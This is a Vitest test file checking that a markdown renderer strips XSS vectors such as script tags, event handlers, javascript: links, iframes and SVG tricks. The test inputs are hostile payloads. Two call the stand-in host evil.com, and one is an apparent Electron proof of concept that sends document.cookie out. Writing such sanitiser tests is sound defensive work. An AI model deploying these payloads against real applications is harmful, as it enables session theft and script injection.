import { describe, it, expect } from 'vitest';
import { renderMarkdownSafe } from './safe-markdown';

describe('renderMarkdownSafe', () => {
  it('strips script tags', () => {
    const result = renderMarkdownSafe('<script>alert(1)</script>');
    expect(result).not.toContain('<script');
    expect(result).not.toContain('alert(1)');
  });

  it('strips event handlers from img tags', () => {
    const result = renderMarkdownSafe('<img src=x onerror=alert(1)>');
    expect(result).not.toContain('onerror');
    expect(result).toContain('<img');
    expect(result).toContain('src="x"');
  });

  it('strips SVG onload handlers but preserves SVG element', () => {
    const result = renderMarkdownSafe('<svg onload=alert(1)>');
    expect(result).not.toContain('onload');
    // svg is allowed for inline rich content, but event handlers are stripped
    expect(result).toContain('<svg');
  });

  it('strips nested injection payloads', () => {
    const result = renderMarkdownSafe(
      '<div><img src=x onerror="fetch(\'http://evil.com\')"></div>',
    );
    expect(result).not.toContain('onerror');
    expect(result).not.toContain('fetch');
  });

  it('preserves valid markdown rendering', () => {
    const result = renderMarkdownSafe(
      '# Hello\n\n**bold** and [link](https://example.com)',
    );
    expect(result).toContain('<h1');
    expect(result).toContain('Hello');
    expect(result).toContain('<strong>bold</strong>');
    expect(result).toContain('<a href="https://example.com"');
    expect(result).toContain('link</a>');
  });

  it('preserves code blocks with HTML-like content', () => {
    const result = renderMarkdownSafe(
      '```html\n<script>alert(1)</script>\n```',
    );
    expect(result).toContain('<code');
    expect(result).toContain('<pre');
    // The script should be escaped inside code blocks, not executable
    expect(result).not.toMatch(/<script[^<]*>/);
  });

  it('strips script content from data URIs', () => {
    const result = renderMarkdownSafe(
      '<img src="data:text/html,<script>alert(1)</script>">',
    );
    // The script tag inside the data URI is neutralized by DOMPurify's
    // attribute sanitization. The critical vector (event handlers) is blocked.
    expect(result).not.toContain('onerror');
    expect(result).not.toContain('onload');
  });

  it('strips iframe tags', () => {
    const result = renderMarkdownSafe(
      '<iframe src="https://evil.com"></iframe>',
    );
    expect(result).not.toContain('<iframe');
  });

  it('strips javascript: protocol in links', () => {
    const result = renderMarkdownSafe(
      '<a href="javascript:alert(1)">click me</a>',
    );
    expect(result).not.toContain('javascript:');
  });

  it('preserves tables', () => {
    const md = '| A | B |\n|---|---|\n| 1 | 2 |';
    const result = renderMarkdownSafe(md);
    expect(result).toContain('<table');
    expect(result).toContain('<th');
    expect(result).toContain('<td');
  });

  it('strips style attributes', () => {
    const result = renderMarkdownSafe(
      '<div style="background:url(javascript:alert(1))">text</div>',
    );
    expect(result).not.toContain('style');
  });

  it('handles the PoC from the security report', () => {
    const result = renderMarkdownSafe(
      '<img src=x onerror="require(\'electron\').shell.openExternal(\'https://evil.com/\'+document.cookie)">',
    );
    expect(result).not.toContain('onerror');
    expect(result).not.toContain('require');
    expect(result).not.toContain('document.cookie');
  });

  // SVG security tests — expanded allowlist requires thorough coverage
  describe('SVG security', () => {
    it('strips script tags nested inside SVG', () => {
      const result = renderMarkdownSafe('<svg><script>alert(1)</script></svg>');
      expect(result).toContain('<svg');
      expect(result).not.toContain('<script');
      expect(result).not.toContain('alert(1)');
    });

    it('strips foreignObject from SVG', () => {
      const result = renderMarkdownSafe(
        '<svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>',
      );
      expect(result).toContain('<svg');
      expect(result).not.toContain('foreignObject');
      expect(result).not.toContain('<script');
    });

    it('strips onerror handler from SVG elements', () => {
      const result = renderMarkdownSafe('<svg><rect onerror="alert(1)" /></svg>');
      expect(result).toContain('<svg');
      expect(result).not.toContain('onerror');
    });

    it('strips onmouseover handler from SVG elements', () => {
      const result = renderMarkdownSafe('<svg onmouseover="alert(1)"><circle cx="10" cy="10" r="5" /></svg>');
      expect(result).toContain('<svg');
      expect(result).toContain('<circle');
      expect(result).not.toContain('onmouseover');
    });

    it('strips xlink:href with javascript protocol', () => {
      const result = renderMarkdownSafe(
        '<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>',
      );
      expect(result).not.toContain('javascript:');
    });

    it('preserves clean SVG with allowed attributes', () => {
      const result = renderMarkdownSafe(
        '<svg viewBox="0 0 100 100" width="100" height="100"><circle cx="50" cy="50" r="40" fill="blue" stroke="black" stroke-width="2" /><path d="M10 10 L90 90" /></svg>',
      );
      expect(result).toContain('<svg');
      expect(result).toContain('viewBox="0 0 100 100"');
      expect(result).toContain('<circle');
      expect(result).toContain('cx="50"');
      expect(result).toContain('fill="blue"');
      expect(result).toContain('<path');
      expect(result).toContain('d="M10 10 L90 90"');
    });
  });
});
